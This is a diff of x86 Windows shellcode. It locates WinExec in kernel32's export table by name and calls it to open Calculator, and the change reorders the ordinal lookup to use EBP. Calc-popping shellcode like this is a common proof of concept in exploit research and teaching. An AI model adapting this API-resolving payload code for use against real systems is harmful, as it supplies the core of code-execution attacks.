@@ -43,16 +43,15 @@ SECTION .text
     ADD     ECX, EDI                    ; ECX = kernel32 + offset(ordinals table) = ordinals table
 ; Found export ordinals table (ECX)
 find_winexec_x86:
+; speculatively load ordinal (EBP)
+    MOVZX   EBP, WORD [ECX + EDX * 2]   ; EBP = [ordinals table + (WinExec function number + 1) * 2] = WinExec function ordinal (eventually)
     INC     EDX                         ; EDX = function number + 1
     LODSD                               ; EAX = &(names table[function number]) = offset(function name)
     CMP     [EDI + EAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
     JNE     find_winexec_x86            ;
-; Found WinExec ordinal (EDX)
-    MOVZX   EDX, WORD [ECX + EDX * 2 - 2]
-                                        ; EDX = [ordinals table + (WinExec function number + 1) * 2 - 2] = WinExec function ordinal
     MOV     ESI, [EDI + EBX + 0x1C]     ; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
     ADD     ESI, EDI                    ; ESI = kernel32 + offset(address table) = &(address table)
-    ADD     EDI, [ESI + EDX * 4]        ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
+    ADD     EDI, [ESI + EBP * 4]        ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
 
     CALL    EDI                         ; WinExec(&("calc"), 0);
     INT3                                ; Crash
